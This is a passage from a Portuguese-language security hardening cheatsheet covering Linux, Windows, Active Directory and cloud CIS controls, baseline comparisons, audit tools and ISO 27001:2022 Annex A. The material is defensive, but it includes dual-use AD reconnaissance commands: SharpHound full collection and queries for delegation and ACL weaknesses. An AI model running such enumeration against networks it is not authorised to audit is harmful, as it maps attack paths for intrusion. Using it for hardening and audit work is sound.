chown root:root /etc/passwd /etc/shadow /etc/sudoers

# Encontrar SUID/SGID suspeitos
find / -perm /6000 -type f 2>/dev/null | grep -v -E "(sudo|su|ping|passwd)"
# World-writable files
find / -xdev -perm -0002 -type f 2>/dev/null

# UFW baseline
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp            # SSH — restringir por IP em produção
ufw enable && ufw status verbose
```

---

##  Windows Hardening (CIS)
`CIS Windows Server 2022 / Windows 11 · GPO · Security Baseline · 50 controles`

### 1. Account Policies `CIS L1`

| Política | Valor CIS |
|----------|-----------|
| Minimum password length | 14 caracteres |
| Maximum password age | 60 dias |
| Minimum password age | 1 dia |
| Enforce password history | 24 senhas |
| Password complexity | Habilitado |
| Account lockout threshold | 5 tentativas |
| Account lockout duration | 15 minutos |
| Reset lockout counter after | 15 minutos |
| Kerberos max ticket lifetime | 10 horas |
| Kerberos max renewal lifetime | 7 dias |
| Kerberos max service ticket | 600 minutos |
| Kerberos clock sync tolerance | 5 minutos |

### 2. Audit Policies `CIS L1`

| Categoria | Configuração |
|-----------|--------------|
| Account Logon — Credential Validation | Success/Failure |
| Account Logon — Kerberos AS/TGS | Success/Failure |
| Account Management — User Account | Success/Failure |
| Account Management — Security Group | Success/Failure |
| Logon/Logoff — Logon | Success/Failure |
| Logon/Logoff — Special Logon | Success |
| Logon/Logoff — Other Logon | Failure |
| Object Access — File Share | Success/Failure |
| Object Access — Removable Storage | Success/Failure |
| Object Access — SAM | Failure |
| Policy Change — Audit Policy | Success/Failure |
| Policy Change — Auth Policy | Success/Failure |
| Policy Change — MPSSVC Rule | Success/Failure |
| Privilege Use — Sensitive Privilege | Success/Failure |
| System — Security State Change | Success |
| System — Security Extension | Success |
| System — System Integrity | Success/Failure |

### 3. Security Options `CIS L1`

| Opção | Configuração |
|-------|--------------|
| UAC Admin Approval Mode | Enabled |
| UAC Prompt behavior (admin) | Prompt for credentials |
| UAC Standard user prompt | Automatically deny |
| LAN Manager Auth Level | Send NTLMv2 only (level 5) |
| LM hash storage | Disabled |
| SMB Server Signing | Always required |
| Network access — Anonymous enum SAM | Disabled |
| Network access — Null sessions | Disabled |
| Interactive logon — Last username | Do not display |
| Interactive logon — Ctrl+Alt+Del | Required |
| RDP — NLA | Required |
| RDP — Encryption Level | High (128-bit) |
| WDigest Authentication | Disabled |
| Credential Guard | Enabled (UEFI lock) |
| Machine inactivity limit | 900 segundos |
| Administrator account | Disabled (renomear) |
| Guest account | Disabled |

### 4. Services & Features `CIS L1`

```powershell
# Desabilitar serviços CIS
$services = @("Browser","FTPSVC","SSDPSRV","upnphost","WMSvc",
              "W3SVC","TlntSvr","SNMP","RemoteRegistry","Fax")
foreach ($svc in $services) {
  Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
  Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
}

# Remover features desnecessárias
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName "TelnetClient" -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName "TFTP" -NoRestart
Disable-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2" -NoRestart

# Verificar SMBv1
Get-SmbServerConfiguration | Select EnableSMB1Protocol
```

### 5. Firewall & Windows Defender `CIS L1`

```powershell
# Firewall — habilitar todos os perfis
Set-NetFirewallProfile -All -Enabled True `
  -DefaultInboundAction Block -DefaultOutboundAction Allow `
  -LogAllowed True -LogBlocked True -LogMaxSizeKilobytes 16384

# Bloquear portas admin de internet
New-NetFirewallRule -DisplayName "Block RDP External" `
  -Direction Inbound -Protocol TCP -LocalPort 3389 `
  -RemoteAddress Internet -Action Block
New-NetFirewallRule -DisplayName "Block WinRM External" `
  -Direction Inbound -Protocol TCP -LocalPort 5985,5986 `
  -RemoteAddress Internet -Action Block

# Windows Defender hardening
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting Advanced
Set-MpPreference -SubmitSamplesConsent SendAllSamples
Set-MpPreference -EnableNetworkProtection Enabled
Set-MpPreference -AttackSurfaceReductionRules_Actions Enabled
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -PUAProtection Enabled
```

### 6. User Rights `CIS L1`

| Direito | Configuração |
|---------|--------------|
| Deny network access | Guests, Local Accounts |
| Deny logon locally | Guests |
| Deny RDP logon | Guests, Local Accounts |
| Manage audit and security log | Somente Administrators |
| Debug programs | Somente Administrators |
| Act as part of the operating system | Nenhum usuário |
| SeBackupPrivilege | Somente Backup Operators |
| Create symbolic links | Somente Administrators |
| Load and unload device drivers | Somente Administrators |

---

##  AD Hardening (CIS)
`CIS AD DS · Privileged Access · Tiering Model · Delegation · 40 controles`

### 1. Políticas de Conta & Autenticação `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Default Domain Policy | Min 14 chars, max age 60d, complexity, lockout 5/15min |
| Fine-Grained PSO (admins) | Min 20 chars, lockout 3/60min, MFA obrigatório |
| NTLM Restriction (Tier 0) | Network security: Restrict NTLM = Deny All |
| Kerberos Encryption | Somente AES128/AES256 — sem DES/RC4 |
| Protected Users Group | Todas as contas Tier 0 |
| Smart Card / MFA | "sc required" em userAccountControl para privilegiados |
| Authentication Policy Silos | Restringir onde contas privilegiadas autenticam |

### 2. Tiered Admin Model `REF`

| Tier | Escopo | Controles |
|------|--------|-----------|
| **Tier 0** | Domain Admins, Enterprise Admins, Schema Admins, DCs | PAW dedicado, sem internet, MFA obrigatório, credential silo |
| **Tier 1** | Server Admins, Service Accounts | Acesso apenas a servidores, não loga em workstations |
| **Tier 2** | Helpdesk, Desktop Admins | Acesso apenas a workstations, nunca DCs ou servidores críticos |
| **PAW** | Privileged Access Workstation por tier | Sem email, sem browser, AppLocker restritivo |
| **JIT/JEA** | Just-In-Time via PIM ou grupos temporários | Acesso privilegiado on-demand com expiração |

### 3. Delegation & ACL Hardening `CIS L2`

```powershell
# Delegação irrestrita — alta criticidade
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser    -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# RBCD — Resource Based Constrained Delegation
Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity' |
  Where { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null }

# Remover delegação irrestrita
Set-ADAccountControl -Identity "COMPUTER$" -TrustedForDelegation $false

# ACLs perigosas em objetos críticos
Get-Acl "AD:\DC=domain,DC=local" | Select -ExpandProperty Access |
  Where {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"} |
  Select IdentityReference, ActiveDirectoryRights

# AdminSDHolder — objetos protegidos
Get-ADObject -Filter {AdminCount -eq 1} -Properties AdminCount | Select Name, DistinguishedName

# BloodHound — mapa completo de ACLs
SharpHound.exe -c All --outputdirectory C:\audit\
```

### 4. GPO Security Hardening `CIS L1`

```powershell
# Gerar relatório de GPOs
Get-GPO -All | Get-GPOReport -ReportType XML | Out-File gpo-audit.xml

# PowerShell Logging via GPO:
# Computer\Windows Settings\Administrative Templates\Windows PowerShell
# ✓ Script Block Logging: Enabled
# ✓ Module Logging: Enabled
# ✓ Transcription: Enabled + invocation logging

# AppLocker — baseline
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path "C:\Windows\System32\cmd.exe"
# Bloquear execução em: %TEMP%, %APPDATA%, %Downloads%
```

### 5. DC Hardening `CIS L1`

| Controle | Configuração |
|----------|--------------|
| SYSVOL Permissions | Somente admins escrevem — auditoria regular `icacls \\domain\SYSVOL` |
| Restricted Admin Mode | Habilitar RDP Restricted Admin para DCs |
| LDAP Signing | Require signing + channel binding obrigatório |
| SMB Signing | Obrigatório em todos os DCs — impede SMB relay |
| DNS Hardening | Sem recursion para externos, DNSSEC nas zonas internas |
| DCshadow Prevention | Monitorar Event 4929 + mudanças em msDS-AllowedToDelegateTo |
| KRBTGT Rotation | Reset 2x (intervalo 10h) após comprometimento — invalida Golden Tickets |

---

##  Cloud Hardening (CIS)
`AWS · Azure · GCP · IAM · Logging · Network · Storage · 55 controles`

### AWS — IAM & Account `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Root Account | MFA obrigatório, sem access keys, não usar para operações |
| IAM Password Policy | Min 14 chars, 1 upper/lower/num/symbol, expire 90d, history 24 |
| MFA para IAM Users | Obrigatório para todos com console access |
| Access Key Rotation | Rotacionar a cada 90 dias, desativar inativos há 90+ dias |
| IAM Least Privilege | Sem wildcards "*", roles para serviços, SCPs no Organizations |
| Support Role | IAM role dedicada para acesso ao AWS Support |

```bash
# CloudTrail — habilitar todas as regiões
aws cloudtrail create-trail \
  --name cis-trail \
  --s3-bucket-name my-cloudtrail-logs \
  --is-multi-region-trail \
  --enable-log-file-validation
aws cloudtrail start-logging --name cis-trail

# CloudWatch — alarmes CIS obrigatórios (metric filters)
# ✓ Unauthorized API calls        ✓ Console signin without MFA
# ✓ Root account usage            ✓ IAM policy changes
# ✓ CloudTrail config changes     ✓ S3 Bucket policy changes
# ✓ VPC security group changes    ✓ VPC route table changes
# ✓ Network gateway changes       ✓ AWS Config changes
```

### AWS — Network & Storage `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Security Groups | Sem `0.0.0.0/0` ou `::/0` nas portas 22 e 3389 |
| VPC Flow Logs | Habilitar em todos os VPCs — retenção mínima 90 dias |
| Default VPC | Não usar — deletar ou não associar recursos |
| S3 Block Public Access | Em todas as buckets e no nível da conta |
| S3 Encryption | SSE-S3 ou SSE-KMS obrigatório — enforce via bucket policy |
| EBS Encryption | `aws ec2 enable-ebs-encryption-by-default` por região |
| KMS Key Rotation | Auto rotation 365 dias em todas as CMKs |
| GuardDuty | Habilitar em todas as regiões via Organizations |

### Azure — IAM & Defender `CIS L1`

| Controle | Configuração |
|----------|--------------|
| MFA / Conditional Access | MFA para todos, bloquear legacy auth, compliant device para admins |
| Global Admin | Máximo 5, todos com MFA, nunca usar para rotina |
| Microsoft Defender for Cloud | Habilitar em todas as subscriptions |
| Defender Plans | Servers, Storage, SQL, App Service, Key Vault, DNS, Resource Manager |
| RBAC | Sem Owner/Contributor para externos, PIM para roles privilegiadas |
| Activity Logs | Retenção 1 ano, export para Log Analytics workspace |

### Azure — Storage & Network `CIS L1`

| Controle | Configuração |
|----------|--------------|
| Storage — HTTPS | Require secure transfer, disable public blob access, disable Shared Key |
| Storage — Firewall | Restringir a VNets e IPs específicos |
| Key Vault | Purge protection + soft delete, firewall habilitado, logging ativo |
| NSG Flow Logs | Habilitar em todos os NSGs, retenção 90 dias |
| DDoS Protection | Azure DDoS Network Protection em VNets de produção |
| Disk Encryption | Azure Disk Encryption com CMK no Key Vault |

### GCP — CIS Foundations `CIS L1`

| Controle | Configuração |
|----------|--------------|
| IAM Service Accounts | Sem admin roles, sem keys > 90 dias, sem keys user-managed desnecessárias |
| MFA / 2-Step | Enforçar via Organization policy — 2FA para todos |
| Cloud Audit Logs | Data Access (Read+Write) em todos os serviços — GCS, BigQuery, Cloud SQL |
| GCS Public Access | `constraints/storage.publicAccessPrevention = Enforced` |
| VPC Firewall | Sem `0.0.0.0/0` nas portas 22 e 3389 |
| CMEK | Customer-managed encryption keys — rotação anual |
| Cloud SCC | Security Command Center Premium — findings e compliance reports |

---

##  Hardening Baselines
`CIS vs STIG vs NIST · Quick-Win Checklist · Ferramentas de Auditoria · 35 itens`

### CIS vs STIG vs NIST — Comparativo

| Critério | CIS Benchmark | DISA STIG | NIST SP 800-53 |
|----------|---------------|-----------|----------------|
| Público-alvo | Empresas privadas, qualquer setor | DoD/governo EUA, contratados | Agências federais, referência global |
| Nível de risco | L1 (básico) e L2 (avançado) | CAT I (crítico) a CAT III (baixo) | Low / Moderate / High |
| Atualização | Frequente, comunidade ativa | Validado pela DISA | Revisões periódicas (Rev 5) |
| Automação | CIS-CAT Pro, InSpec, Ansible | SCAP/SCC, Ansible STIG | OSCAL, OpenSCAP |
| Conformidade | PCI-DSS, HIPAA, ISO 27001, SOC2 | FISMA, FedRAMP (parcial) | FISMA, FedRAMP, CMMC |
| Custo | PDFs gratuitos, CIS-CAT pago | Gratuito | Gratuito |

### Baseline por Sistema Operacional

| Sistema | Framework | Ferramenta de Auditoria |
|---------|-----------|-------------------------|
| Ubuntu 22.04/24.04 | CIS Benchmark L1/L2 | CIS-CAT, Lynis, OpenSCAP |
| RHEL / AlmaLinux 9 | CIS + STIG | OpenSCAP, oscap-anaconda |
| Windows Server 2022 | CIS L1 + MS Security Baseline | CIS-CAT, LGPO, Policy Analyzer |
| Windows 11 | CIS L1 + MS Intune Baseline | CIS-CAT, Intune Compliance |
| macOS Sonoma | CIS macOS Benchmark | CIS-CAT, mSCP, Nessus |
| AWS | CIS AWS Foundations v3.0 | AWS Security Hub, Prowler |
| Azure | CIS Azure Foundations v2.1 | Defender for Cloud, Steampipe |
| GCP | CIS GCP Foundations v3.0 | Security Command Center, Forseti |
| Docker | CIS Docker Benchmark v1.6 | docker-bench-security, Trivy |
| Kubernetes | CIS K8s Benchmark v1.9 | kube-bench, Falco, Kubescape |

### Quick-Win Checklist Universal

```
[CRÍTICO] ✓ Patches         → SO e aplicações atualizados — patch mensal mínimo
[CRÍTICO] ✓ MFA             → Autenticação multifator em todas as contas privilegiadas
[CRÍTICO] ✓ Firewall        → Default deny inbound, log de bloqueios, revisão mensal
[ALTO]    ✓ Logging         → Logs centralizados em SIEM, retenção 12 meses, alertas RT
[ALTO]    ✓ Least Privilege → Sem admin desnecessário, roles mínimas em service accounts
[ALTO]    ✓ Encryption      → Disco cifrado (BitLocker/LUKS), TLS 1.2+, dados em repouso
[MÉDIO]   ✓ Inventory       → CMDB atualizado — hardware, software, cloud assets
[MÉDIO]   ✓ Backup          → Backups imutáveis testados (3-2-1 rule), RPO/RTO validados
[MÉDIO]   ✓ EDR/AV          → EDR em todos os endpoints, telemetria integrada ao SIEM
[PADRÃO]  ✓ Vuln Scan       → Scan mensal autenticado, CVSS ≥ 7.0 remediado em 30 dias
[PADRÃO]  ✓ SSH Keys        → Sem senhas em SSH, authorized_keys auditado regularmente
[PADRÃO]  ✓ NTP             → Sincronização NTP confiável — crítico para Kerberos e logs
```

### Ferramentas de Auditoria `TOOL`

```
Lynis               → Auditoria de hardening Linux   — lynis audit system --pentest
OpenSCAP            → SCAP/OVAL multi-OS             — oscap xccdf eval --profile cis ...
CIS-CAT Pro         → Benchmark oficial CIS          — relatório HTML detalhado
Prowler             → AWS/Azure/GCP 300+ checks      — prowler -p cis -r eu-west-1
ScoutSuite          → Multi-cloud audit              — scout aws --report-dir ./report
docker-bench        → CIS Docker                     — ./docker-bench-security.sh
kube-bench          → CIS Kubernetes                 — kube-bench run --targets master,node
PingCastle          → AD security score              — PingCastle.exe --healthcheck
Policy Analyzer     → GPO vs MS Baseline             — importar GPO XML via GUI
Nessus / Tenable.io → Vuln scan autenticado          — templates CIS e STIG embutidos
```

---

##  ISO/IEC 27001:2022
`ISMS · 93 controles Annex A · 4 Temas · Certificação`

### Visão Geral

```
Edição atual    → ISO/IEC 27001:2022 — publicada outubro 2022
Versão anterior → ISO/IEC 27001:2013 (114 controles)
Controles atuais→ 93 controles em 4 temas
Controles novos → 11 novos controles na versão 2022
Estrutura       → Cláusulas 4–10 (HLS — High Level Structure) + Annex A
SoA             → Statement of Applicability — documentar aplicabilidade e exclusões
Ciclo           → PDCA — Plan-Do-Check-Act contínuo
Temas Annex A   → Organizacional (37) · Pessoas (8) · Físico (14) · Tecnológico (34)
```

### Cláusulas Principais (4–10)

| Cláusula | Nome | Conteúdo Principal |
|----------|------|--------------------|
| **4** | Contexto | Organização, partes interessadas, escopo do ISMS, questões internas/externas |
| **5** | Liderança | Comprometimento da alta direção, política de SI, papéis e responsabilidades |
| **6** | Planejamento | Avaliação de riscos, tratamento, objetivos de SI, plano de tratamento |
| **7** | Suporte | Recursos, competência, conscientização, comunicação, documentação |
| **8** | Operação | Implementar e controlar processos, avaliar e tratar riscos operacionais |
| **9** | Avaliação | Monitoramento, auditoria interna, análise crítica pela direção |
| **10** | Melhoria | Não-conformidades, ações corretivas, melhoria contínua do ISMS |

### Annex A — Controles Organizacionais (5.x) — 37 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 5.1 | Políticas de Segurança | Definir, aprovar e revisar políticas — alinhadas ao negócio |
| 5.2 | Funções e Responsabilidades | Definir e atribuir responsabilidades de SI formalmente |
| 5.3 | Segregação de funções | Separar funções conflitantes — reduz risco de fraude/erro |
| 5.5 | Contato com autoridades | Manter contatos com reguladores, LEA, CERTs |
| 5.7 | **Threat Intelligence** ⭐ | Coletar e analisar informações sobre ameaças para orientar controles |
| 5.8 | Segurança em projetos | Integrar SI em todo o ciclo de vida de projetos |
| 5.10 | Uso aceitável de ativos | Regras para uso adequado de informação e ativos |
| 5.12 | Classificação da informação | Classificar por confidencialidade e criticidade |
| 5.15 | Controle de Acesso | Acesso baseado em necessidade de negócio — need-to-know |
| 5.16 | Gestão de Identidades | Ciclo de vida completo — provisionamento ao desligamento |
| 5.17 | Informações de Autenticação | Senhas, tokens, chaves — políticas e proteção |
| 5.19 | Segurança em fornecedores | Acordar e monitorar requisitos de SI com fornecedores |
| 5.23 | **Cloud Security** ⭐ | Controles para aquisição, uso, gestão e saída de cloud |
| 5.24 | Gestão de Incidentes | Planejar e implementar processo de gestão de incidentes de SI |
| 5.26 | Resposta a Incidentes | Responder a incidentes per procedimentos documentados |
| 5.29 | Continuidade de Negócios | Planejar SI durante disrupções — BCP/DRP integrado |
| 5.30 | **ICT Readiness** ⭐ | Prontidão de TIC para continuidade — RTO/RPO, testes failover |
| 5.36 | Conformidade com políticas | Revisar periodicamente conformidade com políticas |

### Annex A — Controles de Pessoas (6.x) — 8 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 6.1 | Screening | Verificação de antecedentes antes e durante o emprego |
| 6.2 | Termos de Emprego | NDA e responsabilidades de SI no contrato |
| 6.3 | Conscientização & Treinamento | Programa contínuo — phishing, engenharia social, políticas |
| 6.4 | Processo Disciplinar | Ações formais para violações — proporcionalidade |
| 6.5 | Encerramento / Mudança | Revogar acessos e ativos no desligamento ou mudança |
| 6.6 | Acordos de Confidencialidade | NDAs para empregados, contratados, terceiros |
| 6.7 | Trabalho Remoto | VPN, MDM, política BYOD — trabalho fora do perímetro |
| 6.8 | Reporte de Eventos | Canal claro para reporte de incidentes e vulnerabilidades |

### Annex A — Controles Físicos (7.x) — 14 controles

| Controle | Nome | Objetivo |
|----------|------|----------|
| 7.1 | Perímetros Físicos | Barreiras para áreas com ativos de informação |
| 7.2 | Controles de Entrada | Acesso por autenticação (crachá, biometria), registro visitantes |
| 7.3 | Escritórios e Salas | Segurança física de DCs, salas de servidores, arquivos |
| 7.4 | **Monitoramento Físico** ⭐ | CCTV, alarmes, IDS físico — monitoramento de áreas sensíveis |
| 7.6 | Trabalho em Áreas Seguras | Mínimo pessoal, proibição de registro em áreas seguras |
| 7.7 | Mesa Limpa / Tela Limpa | Política mesa limpa + bloqueio automático de tela |
| 7.8 | Equipamentos | Proteção física — UPS, temperatura, cabeamento |
| 7.10 | Mídia de Armazenamento | Inventário, destruição segura, transporte protegido |
| 7.13 | Manutenção de Equipamentos | Manutenção autorizada — evitar comprometimento físico |
| 7.14 | Descarte Seguro | Sanitização antes do descarte — DBAN, certificado de destruição |

### Annex A — Controles Tecnológicos (8.x) — 34 controles

| Controle | Nome | Objetivo / Implementação |
|----------|------|--------------------------|
| 8.2 | Gestão de Acessos Privilegiados | PAM, JIT, auditoria de uso privilegiado |
| 8.3 | Restrição de Acesso | Need-to-know, RBAC, ABAC |
| 8.4 | Acesso ao Código-Fonte | Controle leitura/escrita ao código de sistemas críticos |
| 8.5 | Autenticação Segura | MFA, políticas de senha, proteção contra brute force |
| 8.6 | Gestão de Capacidade | Monitorar uso de recursos, planejar capacidade |
| 8.7 | Proteção contra Malware | AV/EDR, controle de software, conscientização |
| 8.8 | Gestão de Vulnerabilidades | Scan periódico, CVSS scoring, SLA de remediação |
| 8.9 | **Gestão de Configuração** ⭐ | Baseline segura, change management, IaC hardening |
| 8.10 | **Exclusão de Informação** ⭐ | Eliminar dados quando não mais necessários |
| 8.11 | **Mascaramento de Dados** ⭐ | Mascarar dados sensíveis em logs, ambientes de teste |
| 8.12 | **DLP** ⭐ | Data Loss Prevention — classificação, bloqueio de exfiltração |
| 8.15 | Logging | Logs protegidos contra tampering, retidos adequadamente |
| 8.16 | **Monitoramento de Atividades** ⭐ | SIEM, monitoramento de rede, comportamento anômalo |
| 8.19 | Software em Sistemas Prod | Allowlist, change management, sem software não autorizado |
| 8.20 | Segurança de Redes | Segmentação, IDS/IPS, DMZ, controle entre zonas |
| 8.22 | **Filtragem Web** ⭐ | Filtrar acesso a sites maliciosos, proxies de segurança |
| 8.24 | Uso de Criptografia | Política de criptografia — algoritmos aprovados, TLS/mTLS |
| 8.25 | Desenvolvimento Seguro | Secure-by-design, revisão de código, SAST/DAST integrado |
| 8.28 | **Secure Coding** ⭐ | OWASP Top 10, code review obrigatório, dependency scanning |
| 8.29 | Teste de Segurança no Dev | SAST, DAST, pentest antes de produção — SDLC integrado |
| 8.30 | Desenvolvimento Terceirizado | Requisitos de SI em contratos de outsourcing |
| 8.31 | Separação Dev/Test/Prod | Ambientes separados, dados reais mascarados em dev/test |
| 8.34 | Proteção em Auditorias | Minimizar impacto — acesso read-only para auditores |

### Processo de Certificação

```
Gap Analysis    → Mapear estado atual vs ISO 27001 — identificar lacunas e priorizar
Escopo do ISMS  → Definir fronteiras — sistemas, processos, locais, serviços incluídos
Avaliação Risco → Metodologia documentada (ISO 31000), critérios de risco, risk register
Tratamento      → Aceitar / Mitigar / Transferir / Evitar — prazo + responsável
Auditoria Int.  → Auditores independentes do processo auditado — mínimo anual
Stage 1 Audit   → Auditoria documental — ISMS documentado e prontidão do site
Stage 2 Audit   → Auditoria de implementação — controles em operação no campo
Certificação    → Válida 3 anos — vigilância anual (anos 1-2), recertificação ano 3
Organismos      → BSI, Bureau Veritas, SGS, DNV, LRQA, TÜV — acreditados INMETRO/UKAS
```

### ISO 27001 × CIS Controls × NIST CSF — Mapeamento

| ISO 27001 Annex A | CIS Controls v8 | NIST CSF |
|-------------------|-----------------|----------|
| 5.15–5.18 — Access Control | CIS 5, 6 — Account/Access Mgmt | PR.AC |
| 8.8 — Vulnerability Mgmt | CIS 7 — Vulnerability Mgmt | ID.RA / RS.MI |
| 8.7 — Malware Protection | CIS 10 — Malware Defenses | PR.DS / DE.CM |
| 8.15–8.16 — Logging/Monitoring | CIS 8 — Audit Log Mgmt | DE.CM / DE.AE |
| 5.24–5.26 — Incident Mgmt | CIS 17 — Incident Response | RS — Respond |
| 8.9 — Config Management | CIS 4 — Secure Configuration | PR.IP |
| 8.20–8.22 — Network Security | CIS 12, 13 — Network Monitoring | PR.AC / DE.CM |
| 5.29–5.30 — Continuity/ICT | CIS 11 — Data Recovery | RC — Recover |

---

*Security Cheatsheet
